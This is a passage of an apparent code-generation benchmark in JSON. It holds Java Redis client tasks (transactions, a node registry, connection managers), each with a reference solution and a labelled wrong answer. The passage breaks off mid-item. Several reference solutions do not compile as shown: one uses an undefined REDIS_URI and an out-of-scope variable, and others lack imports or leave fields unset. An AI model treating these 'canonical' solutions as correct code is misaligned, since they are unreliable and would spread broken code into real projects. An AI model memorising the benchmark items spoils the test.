    "Instruction": "Task Description: Implement a reliable Redis transaction handler class that manages MULTI/EXEC transactions, WATCH/UNWATCH operations, and connection handling in a Java application using Jedis client library.\n\nClass Description: The ReliableTransaction class provides a robust wrapper around Redis transactions, offering atomic operations, watch mechanisms for optimistic locking, and proper resource management. It handles the complete transaction lifecycle including initiation, command queuing, execution, and cleanup.\n\nAttributes:\n- pipelinedResponses: Queue<Response<?>> - Stores responses for queued commands in a transaction\n- connection: Connection - The Redis connection instance\n- closeConnection: boolean - Flag indicating whether to close the connection when done\n- broken: boolean - Indicates if the connection is in a broken state\n- inWatch: boolean - Tracks WATCH status\n- inMulti: boolean - Tracks MULTI status\n- commandObjects: CommandObjects - Provides command building functionality\n\nMethods:\n- ReliableTransaction(Connection, boolean, boolean, CommandObjects) -> void - Constructor that initializes the transaction handler\n- multi() -> void - Starts a Redis MULTI transaction\n- watch(String...) -> String - Watches given keys for changes (optimistic locking)\n- unwatch() -> String - Removes all watched keys\n- appendCommand(CommandObject<T>) -> Response<T> - Adds a command to the transaction queue\n- close() -> void - Cleans up and optionally closes the connection\n- clear() -> void - Clears current transaction or watch state\n- exec() -> List<Object> - Executes all queued commands atomically\n- discard() -> String - Discards all commands in the current transaction",
    "Canonical_solution": "import redis.clients.jedis.Connection;\nimport redis.clients.jedis.JedisConnectionException;\nimport redis.clients.jedis.JedisDataException;\nimport redis.clients.jedis.JedisException;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Response;\nimport redis.clients.jedis.commands.CommandObjects;\nimport redis.clients.jedis.graph.GraphCommandObjects;\nimport redis.clients.jedis.util.RedisProtocol;\n\nimport java.util.ArrayList;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.Queue;\n\npublic class ReliableTransaction {\n\n    private static final String QUEUED_STR = \"QUEUED\";\n    private final Queue<Response<?>> pipelinedResponses = new LinkedList<>();\n    protected final Connection connection;\n    private final boolean closeConnection;\n    private boolean broken = false;\n    private boolean inWatch = false;\n    private boolean inMulti = false;\n    private final CommandObjects commandObjects;\n\n    public ReliableTransaction(Connection connection, boolean doMulti, boolean closeConnection, CommandObjects commandObjects) {\n        this.connection = connection;\n        this.closeConnection = closeConnection;\n        this.commandObjects = commandObjects;\n        GraphCommandObjects graphCommandObjects = new GraphCommandObjects(this.connection);\n        graphCommandObjects.setBaseCommandArgumentsCreator(protocolCommand -> commandObjects.commandArguments(protocolCommand));\n        if (doMulti) multi();\n    }\n\n    public void multi() {\n        connection.sendCommand(Command.MULTI);\n        String status = connection.getStatusCodeReply();\n        if (!\"OK\".equals(status)) {\n            throw new JedisException(\"MULTI command failed. Received response: \" + status);\n        }\n        inMulti = true;\n    }\n\n    public String watch(final String... keys) {\n        String status = connection.executeCommand(commandObjects.watch(keys));\n        inWatch = true;\n        return status;\n    }\n\n    public String unwatch() {\n        connection.sendCommand(Command.UNWATCH);\n        String status = connection.getStatusCodeReply();\n        inWatch = false;\n        return status;\n    }\n\n    protected <T> Response<T> appendCommand(CommandObject<T> commandObject) {\n        connection.sendCommand(commandObject.getArguments());\n        String status = connection.getStatusCodeReply();\n        if (!QUEUED_STR.equals(status)) {\n            throw new JedisException(status);\n        }\n        Response<T> response = new Response<>(commandObject.getBuilder());\n        pipelinedResponses.add(response);\n        return response;\n    }\n\n    public void close() {\n        try {\n            clear();\n        } finally {\n            if (closeConnection) {\n                connection.close();\n            }\n        }\n    }\n\n    public void clear() {\n        if (broken) return;\n        if (inMulti) {\n            discard();\n        } else if (inWatch) {\n            unwatch();\n        }\n    }\n\n    public List<Object> exec() {\n        if (!inMulti) throw new IllegalStateException(\"EXEC without MULTI\");\n\n        try {\n            connection.sendCommand(Command.EXEC);\n            List<Object> unformatted = connection.getObjectMultiBulkReply();\n            if (unformatted == null) {\n                pipelinedResponses.clear();\n                return null;\n            }\n\n            List<Object> formatted = new ArrayList<>(unformatted.size());\n            for (Object o : unformatted) {\n                try {\n                    Response<?> response = pipelinedResponses.poll();\n                    response.set(o);\n                    formatted.add(response.get());\n                } catch (JedisDataException e) {\n                    formatted.add(e);\n                }\n            }\n            return formatted;\n        } catch (JedisConnectionException jce) {\n            broken = true;\n            throw jce;\n        } finally {\n            inMulti = false;\n            inWatch = false;\n            pipelinedResponses.clear();\n        }\n    }\n\n    public String discard() {\n        if (!inMulti) throw new IllegalStateException(\"DISCARD without MULTI\");\n\n        try {\n            connection.sendCommand(Command.DISCARD);\n            String status = connection.getStatusCodeReply();\n            if (!\"OK\".equals(status)) {\n                throw new JedisException(\"DISCARD command failed. Received response: \" + status);\n            }\n            return status;\n        } catch (JedisConnectionException jce) {\n            broken = true;\n            throw jce;\n        } finally {\n            inMulti = false;\n            inWatch = false;\n            pipelinedResponses.clear();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Response;\nimport redis.clients.jedis.commands.CommandObjects;\nimport redis.clients.jedis.Connection;\n\nimport java.util.Queue;\nimport java.util.LinkedList;\nimport java.util.List;\n\npublic class ReliableTransaction {\n    private final Queue<Response<?>> pipelinedResponses;\n    private final Connection connection;\n    private final boolean closeConnection;\n    private boolean broken;\n    private boolean inWatch;\n    private boolean inMulti;\n    private final CommandObjects commandObjects;\n\n    public ReliableTransaction(Connection connection, boolean closeConnection, boolean inWatch, CommandObjects commandObjects) {\n        this.pipelinedResponses = new LinkedList<>();\n        this.connection = connection;\n        this.closeConnection = closeConnection;\n        this.inWatch = inWatch;\n        this.inMulti = false;\n        this.commandObjects = commandObjects;\n    }\n\n    public void multi() {\n        if (inMulti) {\n            throw new IllegalStateException(\"Already in a MULTI transaction\");\n        }\n        connection.multi();\n        inMulti = true;\n    }\n\n    public String watch(String... keys) {\n        if (inMulti) {\n            throw new IllegalStateException(\"Cannot WATCH while in a MULTI transaction\");\n        }\n        return connection.watch(keys);\n    }\n\n    public String unwatch() {\n        if (inMulti) {\n            throw new IllegalStateException(\"Cannot UNWATCH while in a MULTI transaction\");\n        }\n        return connection.unwatch();\n    }\n\n    public <T> Response<T> appendCommand(CommandObject<T> command) {\n        if (!inMulti) {\n            throw new IllegalStateException(\"Commands must be appended within a MULTI transaction\");\n        }\n        Response<T> response = command.execute(connection);\n        pipelinedResponses.add(response);\n        return response;\n    }\n\n    public void close() {\n        if (closeConnection) {\n            connection.close();\n        }\n    }\n\n    public void clear() {\n        pipelinedResponses.clear();\n        inWatch = false;\n        inMulti = false;\n        broken = false;\n    }\n\n    public List<Object> exec() {\n        if (!inMulti) {\n            throw new IllegalStateException(\"EXEC can only be called within a MULTI transaction\");\n        }\n        List<Object> results = connection.exec();\n        inMulti = false;\n        return results;\n    }\n\n    public String discard() {\n        if (!inMulti) {\n            throw new IllegalStateException(\"DISCARD can only be called within a MULTI transaction\");\n        }\n        return connection.discard();\n    }\n}\n```"
  },
  {
    "Task_id": 312,
    "Instruction": "Task Description: Implement a Redis-based registry class for node registration and subscription in a distributed system, using Java with Jedis client library.\n\nClass Description: RedisRegistry is a class that provides node registration and subscription capabilities using Redis as the backend storage. It maintains connections to Redis servers, handles node registration, and manages subscription to node changes.\n\nAttributes:\n- jedisPools: ConcurrentHashMap<String, JedisPool> - A thread-safe map storing JedisPool instances for different Redis server addresses\n- clusterName: String - The name of the current cluster\n- replicate: boolean - Flag indicating whether operations should be replicated to all Redis servers\n- notifiers: ConcurrentMap<String, Notifier> - A thread-safe map storing Notifier instances for different node paths\n\nMethods:\n- RedisRegistry(AppContext appContext) - Constructor - Initializes the registry with configuration from AppContext\n  Input: appContext: AppContext - The application context containing configuration\n  Output: None\n\n- doRegister(Node node) - protected - Registers a node in Redis\n  Input: node: Node - The node to be registered\n  Output: None (throws NodeRegistryException on failure)\n\n- doSubscribe(Node node, NotifyListener listener) - protected - Subscribes to node changes\n  Input: \n    node: Node - The node that wants to subscribe\n    listener: NotifyListener - The listener to be notified of changes\n  Output: None\n\nNested Classes:\n- NotifySub extends JedisPubSub - Handles Redis pub/sub messages\n  Methods:\n    onMessage(String key, String msg) - Processes incoming messages\n      Input:\n        key: String - The channel/key of the message\n        msg: String - The message content\n      Output: None\n\n- Notifier extends Thread - Manages subscription thread\n  Methods:\n    run() - Main thread execution for subscription\n      Input: None\n      Output: None\n    shutdown() - Stops the subscription thread\n      Input: None\n      Output: None",
    "Canonical_solution": "import com.github.ltsopensource.core.AppContext;\nimport com.github.ltsopensource.core.cluster.Config;\nimport com.github.ltsopensource.core.cluster.Node;\nimport com.github.ltsopensource.core.cluster.NodeType;\nimport com.github.ltsopensource.core.commons.utils.CollectionUtils;\nimport com.github.ltsopensource.core.constant.Constants;\nimport com.github.ltsopensource.core.exception.NodeRegistryException;\nimport com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport com.github.ltsopensource.core.registry.NotifyEvent;\nimport com.github.ltsopensource.core.registry.NotifyListener;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPubSub;\nimport java.util.*;\nimport java.util.concurrent.*;\n\npublic class RedisRegistry {\n\n    private static final Logger LOGGER = LoggerFactory.getLogger(RedisRegistry.class);\n    private final Map<String, JedisPool> jedisPools = new ConcurrentHashMap<String, JedisPool>();\n    private String clusterName;\n    private boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers = new ConcurrentHashMap<String, Notifier>();\n\n    public RedisRegistry(AppContext appContext) {\n        Config config = appContext.getConfig();\n        this.clusterName = config.getClusterName();\n\n        String address = NodeRegistryUtils.getRealRegistryAddress(config.getRegistryAddress());\n        String[] addrs = address.split(\",\");\n        for (String addr : addrs) {\n            int i = addr.indexOf(':');\n            String host = addr.substring(0, i);\n            int port = Integer.parseInt(addr.substring(i + 1));\n            this.jedisPools.put(addr, new JedisPool(new JedisPoolConfig(), host, port, Constants.DEFAULT_TIMEOUT));\n        }\n    }\n\n    protected void doRegister(Node node) {\n        String key = NodeRegistryUtils.getNodeTypePath(clusterName, node.getNodeType());\n        boolean success = false;\n        NodeRegistryException exception = null;\n        for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n            JedisPool jedisPool = entry.getValue();\n            try {\n                Jedis jedis = jedisPool.getResource();\n                try {\n                    jedis.hset(key, node.toFullString(), String.valueOf(SystemClock.now() + Constants.DEFAULT_SESSION_TIMEOUT));\n                    jedis.publish(key, Constants.REGISTER);\n                    success = true;\n                    if (!replicate) {\n                        break;\n                    }\n                } finally {\n                    jedis.close();\n                }\n            } catch (Throwable t) {\n                exception = new NodeRegistryException(\"Failed to register node to redis registry. registry: \" + entry.getKey() + \", node: \" + node + \", cause: \" + t.getMessage(), t);\n            }\n        }\n        if (exception != null && !success) {\n            throw exception;\n        }\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) {\n        List<NodeType> listenNodeTypes = node.getListenNodeTypes();\n        if (CollectionUtils.isEmpty(listenNodeTypes)) {\n            return;\n        }\n        for (NodeType listenNodeType : listenNodeTypes) {\n            String listenNodePath = NodeRegistryUtils.getNodeTypePath(clusterName, listenNodeType);\n            Notifier notifier = notifiers.get(listenNodePath);\n            if (notifier == null) {\n                Notifier newNotifier = new Notifier(listenNodePath);\n                notifiers.putIfAbsent(listenNodePath, newNotifier);\n                notifier = notifiers.get(listenNodePath);\n                if (notifier == newNotifier) {\n                    notifier.start();\n                }\n            }\n        }\n    }\n\n    private class NotifySub extends JedisPubSub {\n        private final JedisPool jedisPool;\n\n        public NotifySub(JedisPool jedisPool) {\n            this.jedisPool = jedisPool;\n        }\n\n        @Override\n        public void onMessage(String key, String msg) {\n            if (msg.equals(Constants.REGISTER) || msg.equals(Constants.UNREGISTER)) {\n                try {\n                    Jedis jedis = jedisPool.getResource();\n                    try {\n                        doNotify(jedis, key);\n                    } finally {\n                        jedis.close();\n                    }\n                } catch (Throwable t) {\n                    LOGGER.error(t.getMessage(), t);\n                }\n            }\n        }\n    }\n\n    private class Notifier extends Thread {\n        private final String listenNodePath;\n        private volatile Jedis jedis;\n        private volatile boolean running = true;\n\n        public Notifier(String listenNodePath) {\n            super.setDaemon(true);\n            super.setName(\"LTSRedisSubscribe\");\n            this.listenNodePath = listenNodePath;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (running) {\n                    for (Map.Entry<String, JedisPool> entry : jedisPools.entrySet()) {\n                        try {\n                            JedisPool jedisPool = entry.getValue();\n                            jedis = jedisPool.getResource();\n                            try {\n                                jedis.subscribe(new NotifySub(jedisPool), listenNodePath);\n                                break;\n                            } finally {\n                                jedis.close();\n                            }\n                        } catch (Throwable t) {\n                            LOGGER.warn(\"Failed to subscribe node from redis registry. registry: \" + entry.getKey(), t);\n                        }\n                    }\n                }\n            } catch (Throwable t) {\n                LOGGER.error(t.getMessage(), t);\n            }\n        }\n\n        public void shutdown() {\n            try {\n                running = false;\n                jedis.disconnect();\n            } catch (Throwable t) {\n                LOGGER.warn(t.getMessage(), t);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPubSub;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.ConcurrentMap;\n\npublic class RedisRegistry {\n    private final ConcurrentHashMap<String, JedisPool> jedisPools;\n    private final String clusterName;\n    private final boolean replicate;\n    private final ConcurrentMap<String, Notifier> notifiers;\n\n    public RedisRegistry(AppContext appContext) {\n        this.jedisPools = new ConcurrentHashMap<>();\n        this.clusterName = appContext.getClusterName();\n        this.replicate = appContext.isReplicate();\n        this.notifiers = new ConcurrentHashMap<>();\n    }\n\n    protected void doRegister(Node node) throws NodeRegistryException {\n        // Implementation for registering a node in Redis\n    }\n\n    protected void doSubscribe(Node node, NotifyListener listener) throws NodeRegistryException {\n        // Implementation for subscribing to node changes\n    }\n\n    private class NotifySub extends JedisPubSub {\n        @Override\n        public void onMessage(String key, String msg) {\n            // Process incoming messages\n        }\n    }\n\n    private class Notifier extends Thread {\n        private volatile boolean running = true;\n\n        @Override\n        public void run() {\n            // Main thread execution for subscription\n        }\n\n        public void shutdown() {\n            running = false;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 313,
    "Instruction": "Task Description: Create a Redis connection manager class in Java using Lettuce client that handles connection setup, management, and cleanup.\n\nClass Description: RedisConnectionManager is a utility class that manages Redis connections using Lettuce client. It provides methods to establish a connection with configurable timeout options, retrieve the active connection, and properly close the connection when no longer needed.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<byte[], byte[]> - The active Redis connection using byte array codec\n\nMethods:\n- setupConnection(String host, int port) -> void - Initializes the Redis client and establishes a connection to the specified Redis server with a 10-second timeout configuration\n- closeConnection() -> void - Properly closes the active connection and shuts down the Redis client\n- getConnection() -> StatefulRedisConnection<byte[], byte[]> - Returns the active Redis connection instance",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport java.time.Duration;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        redisClient = RedisClient.create(RedisURI.create(host, port));\n        redisClient.setOptions(ClientOptions.builder()\n                .timeoutOptions(TimeoutOptions.builder().fixedTimeout(Duration.ofSeconds(10)).build()).build());\n        connection = redisClient.connect(ByteArrayCodec.INSTANCE);\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown(0, 0, TimeUnit.SECONDS);\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.StatefulRedisConnection;\nimport io.lettuce.core.codec.ByteArrayCodec;\n\npublic class RedisConnectionManager {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<byte[], byte[]> connection;\n\n    public void setupConnection(String host, int port) {\n        redisClient = RedisClient.create(\"redis://\" + host + \":\" + port);\n        connection = redisClient.connect(new ByteArrayCodec());\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n\n    public StatefulRedisConnection<byte[], byte[]> getConnection() {\n        return connection;\n    }\n}\n```"
  },
  {
    "Task_id": 315,
    "Instruction": "Task Description: Implement a Redis connection class in Java that handles socket communication, authentication, and basic Redis operations while managing connection state and resources.\n\nClass Description: The Connection class represents a Redis client connection that manages socket communication with a Redis server. It handles connection establishment, command sending, response reading, and connection cleanup. The class implements Closeable for proper resource management.\n\nAttributes:\n- socketFactory: JedisSocketFactory - Factory for creating socket connections to Redis\n- socket: Socket - The underlying socket connection to Redis\n- outputStream: RedisOutputStream - Output stream for sending commands to Redis\n- inputStream: RedisInputStream - Input stream for reading responses from Redis\n- soTimeout: int - Socket timeout setting\n- broken: boolean - Flag indicating if the connection is in a broken state\n- currentCredentials: AtomicReference<RedisCredentials> - Current authentication credentials\n- authXManager: AuthXManager - Manager for authentication operations\n\nMethods:\n- Connection(JedisSocketFactory) -> void - Constructor that initializes with a socket factory\n- connect() -> void - Establishes connection to Redis server\n- disconnect() -> void - Closes the connection to Redis server\n- isConnected() -> boolean - Checks if connection is active\n- isBroken() -> boolean - Checks if connection is in broken state\n- setBroken() -> void - Marks connection as broken\n- sendCommand(ProtocolCommand, byte[]...) -> void - Sends a Redis command with arguments\n- getOne() -> Object - Reads and returns a single response from Redis\n- flush() -> void - Flushes the output stream\n- readProtocolWithCheckingBroken() -> Object - Reads protocol response while checking connection state\n- close() -> void - Implements Closeable interface to disconnect (alias for disconnect)",
    "Canonical_solution": "import java.io.Closeable;\nimport java.io.IOException;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.Arrays;\nimport java.util.Map;\nimport java.util.concurrent.atomic.AtomicReference;\n\nimport redis.clients.jedis.Protocol;\nimport redis.clients.jedis.Protocol.Command;\nimport redis.clients.jedis.Protocol.Keyword;\nimport redis.clients.jedis.args.Rawable;\nimport redis.clients.jedis.authentication.AuthXManager;\nimport redis.clients.jedis.commands.ProtocolCommand;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisDataException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport redis.clients.jedis.util.IOUtils;\nimport redis.clients.jedis.util.RedisInputStream;\nimport redis.clients.jedis.util.RedisOutputStream;\n\npublic class Connection implements Closeable {\n\n  private final JedisSocketFactory socketFactory;\n  private Socket socket;\n  private RedisOutputStream outputStream;\n  private RedisInputStream inputStream;\n  private int soTimeout = 0;\n  private boolean broken = false;\n  private AtomicReference<RedisCredentials> currentCredentials = new AtomicReference<>(null);\n  private AuthXManager authXManager;\n\n  public Connection(final JedisSocketFactory socketFactory) {\n    this.socketFactory = socketFactory;\n  }\n\n  public void connect() throws JedisConnectionException {\n    if (!isConnected()) {\n      try {\n        socket = socketFactory.createSocket();\n        outputStream = new RedisOutputStream(socket.getOutputStream());\n        inputStream = new RedisInputStream(socket.getInputStream());\n        broken = false;\n      } catch (JedisConnectionException jce) {\n        setBroken();\n        throw jce;\n      } catch (IOException ioe) {\n        setBroken();\n        throw new JedisConnectionException(\"Failed to create input/output stream\", ioe);\n      } finally {\n        if (broken) {\n          IOUtils.closeQuietly(socket);\n        }\n      }\n    }\n  }\n\n  public void disconnect() {\n    if (isConnected()) {\n      try {\n        outputStream.flush();\n        socket.close();\n      } catch (IOException ex) {\n        throw new JedisConnectionException(ex);\n      } finally {\n        IOUtils.closeQuietly(socket);\n        setBroken();\n      }\n    }\n  }\n\n  public boolean isConnected() {\n    return socket != null && socket.isBound() && !socket.isClosed() && socket.isConnected()\n        && !socket.isInputShutdown() && !socket.isOutputShutdown();\n  }\n\n  public boolean isBroken() {\n    return broken;\n  }\n\n  public void setBroken() {\n    broken = true;\n  }\n\n  public void sendCommand(final ProtocolCommand cmd, final byte[]... args) {\n    try {\n      connect();\n      Protocol.sendCommand(outputStream, new CommandArguments(cmd).addObjects((Object[]) args));\n    } catch (JedisConnectionException ex) {\n      setBroken();\n      throw ex;\n    }\n  }\n\n  public Object getOne() {\n    flush();\n    return readProtocolWithCheckingBroken();\n  }\n\n  protected void flush() {\n    try {\n      outputStream.flush();\n    } catch (IOException ex) {\n      setBroken();\n      throw new JedisConnectionException(ex);\n    }\n  }\n\n  protected Object readProtocolWithCheckingBroken() {\n    if (broken) {\n      throw new JedisConnectionException(\"Attempting to read from a broken connection.\");\n    }\n    try {\n      return Protocol.read(inputStream);\n    } catch (JedisConnectionException exc) {\n      broken = true;\n      throw exc;\n    }\n  }\n\n  @Override\n  public void close() {\n    disconnect();\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.Socket;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class Connection implements Closeable {\n    private final JedisSocketFactory socketFactory;\n    private Socket socket;\n    private RedisOutputStream outputStream;\n    private RedisInputStream inputStream;\n    private int soTimeout;\n    private boolean broken;\n    private AtomicReference<RedisCredentials> currentCredentials;\n    private AuthXManager authXManager;\n\n    public Connection(JedisSocketFactory socketFactory) {\n        this.socketFactory = socketFactory;\n        this.currentCredentials = new AtomicReference<>();\n    }\n\n    public void connect() throws IOException {\n        if (isConnected()) {\n            return;\n        }\n        socket = socketFactory.createSocket();\n        socket.setSoTimeout(soTimeout);\n        outputStream = new RedisOutputStream(socket.getOutputStream());\n        inputStream = new RedisInputStream(socket.getInputStream());\n        broken = false;\n    }\n\n    public void disconnect() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            // Handle exception\n        } finally {\n            socket = null;\n            outputStream = null;\n            inputStream = null;\n        }\n    }\n\n    public boolean isConnected() {\n        return socket != null && !socket.isClosed() && socket.isConnected();\n    }\n\n    public boolean isBroken() {\n        return broken;\n    }\n\n    public void setBroken() {\n        broken = true;\n    }\n\n    public void sendCommand(ProtocolCommand command, byte[]... args) throws IOException {\n        if (isBroken()) {\n            throw new RuntimeException(\"Connection is broken\");\n        }\n        outputStream.write(command.getCommand());\n        for (byte[] arg : args) {\n            outputStream.writeInt(arg.length);\n            outputStream.write(arg);\n        }\n        outputStream.flush();\n    }\n\n    public Object getOne() throws IOException {\n        return readProtocolWithCheckingBroken();\n    }\n\n    public void flush() throws IOException {\n        outputStream.flush();\n    }\n\n    public Object readProtocolWithCheckingBroken() throws IOException {\n        if (isBroken()) {\n            throw new RuntimeException(\"Connection is broken\");\n        }\n        return inputStream.readProtocol();\n    }\n\n    @Override\n    public void close() throws IOException {\n        disconnect();\n    }\n}\n```"
  },
  {
    "Task_id": 318,
    "Instruction": "Task Description: Create a Redis connection manager class that handles both standalone and cluster Redis connections with token-based authentication for multiple users.\n\nClass Description: The RedisConnectionManager class provides functionality to establish and manage Redis connections (both standalone and cluster) using token-based authentication. It supports multiple authentication credentials and configures connection options like timeouts and reauthentication behavior.\n\nAttributes:\n- redisClient: RedisClient - The client for standalone Redis connections\n- redisClusterClient: RedisClusterClient - The client for Redis cluster connections\n- credentialsUser1: TokenBasedRedisCredentialsProvider - Authentication credentials provider for user 1\n- credentialsUser2: TokenBasedRedisCredentialsProvider - Authentication credentials provider for user 2\n\nMethods:\n- RedisConnectionManager(String redisUri, String authority, Set<String> scopes, String user1ClientId, String user1Secret, String user2ClientId, String user2Secret) -> void - Constructor that initializes the connection manager with Redis URI, authentication authority, scopes, and credentials for two users\n- createStandaloneConnection() -> StatefulRedisConnection<String, String> - Creates and returns a standalone Redis connection using user1 credentials\n- createStandaloneConnectionWithUser2() -> StatefulRedisConnection<String, String> - Creates and returns a standalone Redis connection using user2 credentials\n- createClusterConnection() -> StatefulRedisClusterConnection<String, String> - Creates and returns a Redis cluster connection\n- close() -> void - Closes all connections and releases resources",
    "Canonical_solution": "import io.lettuce.authx.TokenBasedRedisCredentialsProvider;\nimport io.lettuce.core.ClientOptions;\nimport io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.SocketOptions;\nimport io.lettuce.core.TimeoutOptions;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.cluster.ClusterClientOptions;\nimport io.lettuce.core.cluster.RedisClusterClient;\nimport io.lettuce.core.cluster.api.StatefulRedisClusterConnection;\nimport io.lettuce.core.cluster.api.sync.NodeSelection;\nimport io.lettuce.core.cluster.api.sync.RedisAdvancedClusterCommands;\nimport io.lettuce.core.codec.StringCodec;\nimport redis.clients.authentication.core.IdentityProviderConfig;\nimport redis.clients.authentication.core.TokenAuthConfig;\nimport redis.clients.authentication.entraid.EntraIDTokenAuthConfigBuilder;\n\nimport java.time.Duration;\nimport java.util.Collections;\nimport java.util.Set;\n\npublic class RedisConnectionManager {\n\n    private RedisClient redisClient;\n    private RedisClusterClient redisClusterClient;\n    private TokenBasedRedisCredentialsProvider credentialsUser1;\n    private TokenBasedRedisCredentialsProvider credentialsUser2;\n\n    public RedisConnectionManager(String redisUri, String authority, Set<String> scopes, \n                                String user1ClientId, String user1Secret, \n                                String user2ClientId, String user2Secret) {\n        IdentityProviderConfig config1;\n        try (EntraIDTokenAuthConfigBuilder builder = EntraIDTokenAuthConfigBuilder.builder()) {\n            config1 = builder.authority(authority).clientId(user1ClientId).secret(user1Secret).scopes(scopes)\n                    .tokenRequestExecTimeoutInMs(10000).build().getIdentityProviderConfig();\n        }\n\n        TokenAuthConfig tokenAuthConfigUser1 = TokenAuthConfig.builder().tokenRequestExecTimeoutInMs(10000)\n                .expirationRefreshRatio(0.1f).identityProviderConfig(config1).build();\n        credentialsUser1 = TokenBasedRedisCredentialsProvider.create(tokenAuthConfigUser1);\n\n        IdentityProviderConfig config2 = EntraIDTokenAuthConfigBuilder.builder().authority(authority).clientId(user2ClientId)\n                .secret(user2Secret).scopes(scopes).tokenRequestExecTimeoutInMs(10000).build().getIdentityProviderConfig();\n        TokenAuthConfig tokenAuthConfigUser2 = TokenAuthConfig.builder().tokenRequestExecTimeoutInMs(10000)\n                .expirationRefreshRatio(0.1f).identityProviderConfig(config2).build();\n        credentialsUser2 = TokenBasedRedisCredentialsProvider.create(tokenAuthConfigUser2);\n\n        RedisURI redisURI1 = RedisURI.create(redisUri);\n        redisURI1.setCredentialsProvider(credentialsUser1);\n\n        RedisURI redisURI2 = RedisURI.create(redisUri);\n        redisURI2.setCredentialsProvider(credentialsUser2);\n\n        ClientOptions clientOptions = ClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(5)).build())\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.REJECT_COMMANDS)\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        redisClient = RedisClient.create(redisURI1);\n        redisClient.setOptions(clientOptions);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnection() {\n        return redisClient.connect(StringCodec.UTF8);\n    }\n\n    public StatefulRedisConnection<String, String> createStandaloneConnectionWithUser2() {\n        RedisURI redisURI2 = RedisURI.create(REDIS_URI);\n        redisURI2.setCredentialsProvider(credentialsUser2);\n        return redisClient.connect(StringCodec.UTF8, redisURI2);\n    }\n\n    public StatefulRedisClusterConnection<String, String> createClusterConnection() {\n        ClusterClientOptions clusterClientOptions = ClusterClientOptions.builder()\n                .socketOptions(SocketOptions.builder().connectTimeout(Duration.ofSeconds(5)).build())\n                .disconnectedBehavior(ClientOptions.DisconnectedBehavior.REJECT_COMMANDS)\n                .timeoutOptions(TimeoutOptions.enabled(Duration.ofSeconds(1)))\n                .reauthenticateBehavior(ClientOptions.ReauthenticateBehavior.ON_NEW_CREDENTIALS).build();\n\n        redisClusterClient = RedisClusterClient.create(redisURI1);\n        redisClusterClient.setOptions(clusterClientOptions);\n        return redisClusterClient.connect(StringCodec.UTF8);\n    }\n\n    public void close() {\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n        if (redisClusterClient != null) {\n            redisClusterClient.shutdown();\n        }\n        if (credentialsUser1 != null) {\n            credentialsUser1.close();\n        }\n        if (credentialsUser2 != null) {\n            credentialsUser2.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
